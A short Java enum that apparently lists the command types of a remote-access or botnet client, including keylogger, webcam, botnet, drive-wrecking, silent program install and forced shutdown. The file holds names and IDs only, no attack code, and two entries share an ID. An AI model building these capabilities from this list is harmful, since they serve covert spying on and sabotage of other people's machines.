package me.sebsb.utils;

public enum MessageType {

	DISCORD(1),
	ALTF4(2),
	MESSAGE_BOX(2),
	BOTNET(3),
	DRIVEFUCKER(4),
	DESKTOP(5),
	OPEN_URL(6),
	INSTALL_CLIENT(7),
	WEBCAM(8),
	INSTALLPROGRAM(9),
	SHUTDOWN(10),
	KEYLOGGER(11),
	GUI_TEXT(12),
	INFO(13);
	
	private int id;
	
	MessageType(int id) {
		this.id = id;
	}
	
	public int getID() {
		return this.id;
	}
}
